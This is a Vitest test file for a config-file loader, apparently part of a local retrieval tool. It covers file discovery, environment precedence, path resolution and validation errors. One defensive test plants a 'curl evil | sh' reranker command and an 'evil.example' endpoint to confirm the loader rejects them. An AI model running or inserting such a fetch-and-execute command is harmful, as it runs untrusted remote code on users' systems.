import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { expectError } from '../../__tests__/test-doubles.js'
import { applyConfigFile, CONFIG_FILE_NAME, ConfigFileError } from '../config-file.js'

let root: string
let repo: string
let nested: string

function writeConfig(directory: string, content: unknown): string {
  const path = join(directory, CONFIG_FILE_NAME)
  writeFileSync(path, typeof content === 'string' ? content : JSON.stringify(content))
  return path
}

function thrownBy(action: () => void): Error {
  try {
    action()
  } catch (caught) {
    return expectError(caught)
  }
  throw new Error('expected the call to throw')
}

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), 'rag-config-'))
  repo = join(root, 'repo')
  nested = join(repo, 'docs', 'deep')
  mkdirSync(nested, { recursive: true })
})

afterAll(() => {
  rmSync(root, { recursive: true, force: true })
})

describe('applyConfigFile', () => {
  it('does nothing when no file exists', () => {
    const empty = mkdtempSync(join(root, 'empty-'))
    const env: NodeJS.ProcessEnv = {}

    expect(applyConfigFile(env, empty)).toEqual({ applied: [], warnings: [] })
    expect(env).toEqual({})
  })

  it('fills unset variables from the nearest file above the working directory', () => {
    const path = writeConfig(repo, {
      EMBED_BACKEND: 'lmstudio',
      LMSTUDIO_MODEL: 'text-embedding-embeddinggemma-300m',
      LMSTUDIO_BATCH_SIZE: 8,
      STORE_IMAGES: true,
      IGNORE_PATHS: ['.sem/**'],
    })
    const env: NodeJS.ProcessEnv = {}

    const result = applyConfigFile(env, nested)

    expect(result.path).toBe(path)
    expect(result.warnings).toEqual([])
    expect(env).toEqual({
      EMBED_BACKEND: 'lmstudio',
      LMSTUDIO_MODEL: 'text-embedding-embeddinggemma-300m',
      LMSTUDIO_BATCH_SIZE: '8',
      STORE_IMAGES: 'true',
      IGNORE_PATHS: '[".sem/**"]',
    })
  })

  it('lets the environment win key by key, treating empty as unset', () => {
    writeConfig(repo, {
      EMBED_BACKEND: 'lmstudio',
      LMSTUDIO_MODEL: 'from-file',
      DB_PATH: resolve('/abs/db'),
    })
    const env: NodeJS.ProcessEnv = { LMSTUDIO_MODEL: 'from-env', DB_PATH: '' }

    const result = applyConfigFile(env, repo)

    expect(env['LMSTUDIO_MODEL']).toBe('from-env')
    expect(env['EMBED_BACKEND']).toBe('lmstudio')
    expect(env['DB_PATH']).toBe(resolve('/abs/db'))
    expect([...result.applied].sort()).toEqual(['DB_PATH', 'EMBED_BACKEND'])
  })

  it('resolves relative paths against the file, not the working directory', () => {
    writeConfig(repo, {
      DB_PATH: '.rag/lancedb',
      CACHE_DIR: resolve('/abs/models'),
      BASE_DIRS: ['docs', resolve('/abs/specs')],
    })
    const env: NodeJS.ProcessEnv = {}

    applyConfigFile(env, nested)

    expect(env['DB_PATH']).toBe(resolve(repo, '.rag/lancedb'))
    expect(env['CACHE_DIR']).toBe(resolve('/abs/models'))
    expect(JSON.parse(env['BASE_DIRS'] ?? '[]')).toEqual([
      resolve(repo, 'docs'),
      resolve('/abs/specs'),
    ])
  })

  it('does not add a document root when the environment already sets one', () => {
    writeConfig(repo, { BASE_DIR: 'docs', BASE_DIRS: ['docs'], DB_PATH: 'db' })
    const env: NodeJS.ProcessEnv = { BASE_DIRS: '["/from/env"]' }

    applyConfigFile(env, repo)

    expect(env['BASE_DIR']).toBeUndefined()
    expect(env['BASE_DIRS']).toBe('["/from/env"]')
    expect(env['DB_PATH']).toBe(resolve(repo, 'db'))
  })

  it('ignores environment-only and unknown keys with a warning', () => {
    writeConfig(repo, {
      RAG_RERANK_CMD: 'curl evil | sh',
      HF_ENDPOINT: 'https://evil.example',
      NOT_A_SETTING: 'x',
      DB_PATH: 'db',
    })
    const env: NodeJS.ProcessEnv = {}

    const result = applyConfigFile(env, repo)

    expect(env['RAG_RERANK_CMD']).toBeUndefined()
    expect(env['HF_ENDPOINT']).toBeUndefined()
    expect(env['NOT_A_SETTING']).toBeUndefined()
    expect(result.warnings).toHaveLength(3)
    expect(result.warnings.join('\n')).toContain('RAG_RERANK_CMD')
    expect(result.warnings.join('\n')).toContain('can only be set through the environment')
    expect(result.warnings.join('\n')).toContain('Unknown setting "NOT_A_SETTING"')
  })

  it.each([
    ['invalid JSON', '{ nope', /not valid JSON/],
    ['a non-object', '[1]', /must contain a JSON object/],
    ['a null', 'null', /must contain a JSON object/],
    [
      'a nested object value',
      { DB_PATH: { a: 1 } },
      /DB_PATH .* must be a string, number or boolean/,
    ],
    ['a non-string array item', { IGNORE_PATHS: [1] }, /IGNORE_PATHS .* array of strings/],
    ['an array for a scalar key', { DB_PATH: ['a'] }, /DB_PATH .* must be a string/],
  ])('throws for %s instead of falling back', (_name, content, message) => {
    writeConfig(repo, content)

    const error = thrownBy(() => applyConfigFile({}, repo))

    expect(error).toBeInstanceOf(ConfigFileError)
    expect(error.message).toMatch(message)
  })

  it('reads the file named by MCP_LOCAL_RAG_CONFIG from any working directory', () => {
    const elsewhere = mkdtempSync(join(root, 'elsewhere-'))
    const path = writeConfig(repo, { EMBED_BACKEND: 'lmstudio' })
    const env: NodeJS.ProcessEnv = { MCP_LOCAL_RAG_CONFIG: path }

    const result = applyConfigFile(env, elsewhere)

    expect(result.path).toBe(path)
    expect(env['EMBED_BACKEND']).toBe('lmstudio')
  })

  it('throws when MCP_LOCAL_RAG_CONFIG names a missing file', () => {
    const error = thrownBy(() =>
      applyConfigFile({ MCP_LOCAL_RAG_CONFIG: join(root, 'missing.json') }, repo)
    )

    expect(error.message).toMatch(/MCP_LOCAL_RAG_CONFIG points to/)
  })
})
